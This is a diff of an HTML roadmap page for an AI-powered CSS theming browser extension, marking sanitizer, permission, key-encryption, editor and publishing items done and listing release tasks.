-        <li><input type="checkbox" disabled><div><div class="t">Unit tests with Vitest + WXT testing plugin</div><div class="d">Cover <code>extractCss</code>, <code>sanitizeCss</code> (escape tricks), SSE parsing per provider (recorded fixtures), prompt building.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">AST-based sanitizer with css-tree</div><div class="d">Swap the regex + re-parse approach for an allow-list walk of the CSS tree.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Resize the icon</div><div class="d"><code>icon.png</code> is 1.16 MB. Ship 16/32/48/128 px PNGs (stores reject oversized assets).</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Firefox AMO metadata</div><div class="d">Add <code>data_collection_permissions</code> to <code>gecko</code> settings (required for new AMO listings) and state that data goes to AI providers.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Manual smoke test in Chrome and Firefox with every provider <span class="tag">blocker</span></div><div class="d">Unit tests, CI config and builds pass, but no real browser test has run yet. Follow the <a href="#testing">checklist</a>, which now covers Phases 3 and 4 (permissions, rules, import/export, key protection, estimates, localisation).</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Undo and version history for generations</div><div class="d">Session Undo stack (30 steps) + last 20 saved versions per style in a History menu. Delete now asks for confirmation.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Inject into tabs that were open before install</div><div class="d"><code>scripting</code> permission. The popup and editor ping the tab and inject the content script if nothing answers.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Host-permission checks (Firefox, and Chrome “on click”)</div><div class="d">Popup banner for site access. Provider host requested during the click in settings and editor.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Unit tests with Vitest + WXT testing plugin</div><div class="d">42 tests across sanitizer, providers, digest, history, prompt and permissions.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">AST-based sanitizer with css-tree</div><div class="d">Cuts unsafe source ranges, keeps formatting, re-checks in the browser. Subpath imports keep the editor bundle at about 92 KB.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Resize the icon</div><div class="d">16/32/48/96/128 px PNGs in <code>public/icon/</code>. The source moved to <code>design/icon-source.png</code>. Package went from 1.22 MB to 161 KB.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Firefox AMO metadata</div><div class="d"><code>data_collection_permissions</code> added (Firefox builds only). Review the chosen categories before submitting.</div></div></li>
       </ul>
     </section>
 
     <section class="phase">
-      <h3>Phase 3: Better themes <span class="pill later">later</span></h3>
+      <h3>Phase 3: Better themes <span class="pill done">done</span></h3>
       <ul class="todo">
-        <li><input type="checkbox" disabled><div><div class="t">Replace the editor with CodeMirror 6</div><div class="d">Implement the same <code>CssEditor</code> API (value, onChange, setReadOnly). Adds lint, real undo, search, color swatches.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Two-step generation: design tokens → CSS</div><div class="d">Model writes a JSON palette/typography/radius first, then maps it to the site. Add a token editor to tweak colors without regenerating.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Conversation-style refinement</div><div class="d">Keep the instruction history per style and send recent turns. Show it as a chat in the editor.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Screenshot input for vision models</div><div class="d"><code>tabs.captureVisibleTab</code>, opt-in, downscaled. Then a “check my theme” pass that critiques a screenshot of the result.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Contrast checker</div><div class="d">Measure text/background contrast on the previewed page and feed failures back into a fix-up prompt.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Better injection</div><div class="d"><code>@layer pagecraft</code>, <code>all_frames</code> for iframes, open Shadow DOM roots, single-page-app route changes.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Replace the editor with CodeMirror 6</div><div class="d">Same <code>CssEditor</code> API. Completion, search, folding, real undo (a generation is one step), color swatches with picker, css-tree lint. The editor bundle is about 540 KB minified (around 170 KB gzipped), loaded from disk.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Design tokens → CSS, with a Palette editor</div><div class="d">Tokens and CSS come in one response (tokens first). Strictly validated tokens become a <code>:root { --pc-* }</code> block that the Palette panel edits without AI.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Conversation-style refinement</div><div class="d">Instruction + summary turns saved per style (20), last 6 replayed. Shown as a collapsible conversation with Clear.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Screenshot input and Review pass</div><div class="d">Opt-in downscaled JPEG (Firefox <code>captureTab</code>, Chrome brief activate). Review critiques and fixes the previewed theme.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Contrast checker</div><div class="d">In-page WCAG AA scan after each preview. Chip + details list, and failures go into Review.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Better injection</div><div class="d">All frames (setting), open shadow roots (opt-in setting), style element kept alive and last in <code>&lt;head&gt;</code> through SPA navigation. <code>@layer</code> deliberately not used (see <a href="#generation">How themes are injected</a>).</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Follow-ups found while building</div><div class="d">Token contrast ratings in the Palette panel. Per-site overrides (pause, iframes, web components). Preview in same-site iframes. Contrast scan with a 150 ms budget and adaptive delay.</div></div></li>
       </ul>
     </section>
 
     <section class="phase">
-      <h3>Phase 4: Product polish <span class="pill later">later</span></h3>
+      <h3>Phase 4: Product polish <span class="pill done">done</span></h3>
       <ul class="todo">
-        <li><input type="checkbox" disabled><div><div class="t">Host patterns and global themes</div><div class="d">Match <code>*.example.com</code>, path rules, or apply a theme everywhere.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Import / export themes as JSON</div><div class="d">Backup, sharing, and later a community gallery.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Narrower permissions</div><div class="d">Ask for site and provider hosts at runtime (<code>optional_host_permissions</code>) instead of <code>&lt;all_urls&gt;</code>. Faster store review.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Optional API key encryption</div><div class="d">Passphrase-derived key (PBKDF2 + AES-GCM through WebCrypto), unlocked once per session.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Token and cost estimate before sending</div><div class="d">Show digest size, plus a setting for the digest budget.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">CI and store publishing</div><div class="d">GitHub Actions: compile, test, <code>wxt zip</code> for both browsers. <code>wxt submit</code> to the Chrome Web Store and AMO.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Localisation (i18n)</div><div class="d">Use WXT's i18n module for UI strings.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Optional JavaScript tweaks via <code>userScripts</code></div><div class="d">Only if needed. The user must enable it in the browser, and it needs separate review. CSS stays the default.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Host patterns and global themes</div><div class="d"><code>example.com</code>, <code>*.example.com</code>, path prefixes and <code>*</code>. Most specific match wins. Rules can be paused. 1.x data is migrated automatically. Managed in settings.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Import / export themes as JSON</div><div class="d">All or one style with rules. No keys, history or conversations. Imports are sanitized and merged.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Narrower permissions</div><div class="d">No host access at install. Per-site / all-sites grants from the popup, provider hosts on first use, background-registered content script, revocable in settings. Firefox minimum is now 128.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Optional API key encryption</div><div class="d">PBKDF2 (600k) + AES-GCM. Unlocked once per browser session (settings or the editor dialog). Lock and remove-protection actions.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Token and cost estimate</div><div class="d">Live estimate before sending, reported usage after (all providers), cost only with user-entered prices, and a page-detail setting (small/normal/large).</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">CI and store publishing</div><div class="d"><code>ci.yml</code> (compile, test, zip artifacts). Manual <code>release.yml</code> with dry run, store choice, approval environment and GitHub release.</div></div></li>
+        <li class="is-done"><input type="checkbox" checked disabled><div><div class="t">Localisation (i18n)</div><div class="d"><code>browser.i18n</code> with typed keys, 180 English messages (manifest, all markup, popup and settings). Editor status messages still English (see below).</div></div></li>
+        <li class="is-declined"><input type="checkbox" disabled><div><div class="t">Optional JavaScript tweaks via <code>userScripts</code> <span class="tag">declined</span></div><div class="d">Decided against. Letting AI write JavaScript that runs on every page is a far bigger security and store-review risk than CSS, the API needs a manual browser toggle, and every theming goal so far was reachable with CSS. Revisit only for a concrete need, and then with hand-written (not generated) scripts.</div></div></li>
+      </ul>
+    </section>
+
+    <section class="phase">
+      <h3>Next: before and after the first store release <span class="pill next">open</span></h3>
+      <ul class="todo">
+        <li><input type="checkbox" disabled><div><div class="t">Run the manual smoke test in Chrome and Firefox <span class="tag">blocker</span></div><div class="d">Especially the new permission flow, the upgrade from 1.3, Firefox 128 behaviour of <code>optional_host_permissions</code> and <code>persistAcrossSessions</code>, and the vault after a browser restart.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Store listing assets <span class="tag">release</span></div><div class="d">Screenshots, promo tile, short/long description, privacy policy page (what is sent to AI providers), AMO data-collection review. Then a first dry run of <code>release.yml</code>.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Finish localisation</div><div class="d">Move the editor's status messages and palette labels into the catalog, then add a first translation.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Community theme gallery</div><div class="d">Builds on the export format: browse and import shared themes, with the same sanitizing on import.</div></div></li>
+        <li><input type="checkbox" disabled><div><div class="t">Smaller editor bundle</div><div class="d">Load CodeMirror and css-tree lazily, or trim unused CodeMirror features (about 470 KB minified today).</div></div></li>
       </ul>
     </section>
   </main>
@@ -278,9 +436,11 @@ ai: {
   // Count roadmap items so the summary pills stay accurate as the list is edited.
   const items = [...document.querySelectorAll(".todo li")];
   const done = items.filter((li) => li.classList.contains("is-done")).length;
+  const declined = items.filter((li) => li.classList.contains("is-declined")).length;
   const pills = [
     ["done", `${done} done`],
-    ["next", `${items.length - done} open`],
+    ["next", `${items.length - done - declined} open`],
+    ["later", `${declined} declined`],
   ];
   document.getElementById("summary").innerHTML = pills
     .map(([cls, text]) => `<span class="pill ${cls}">${text}</span>`).join("");
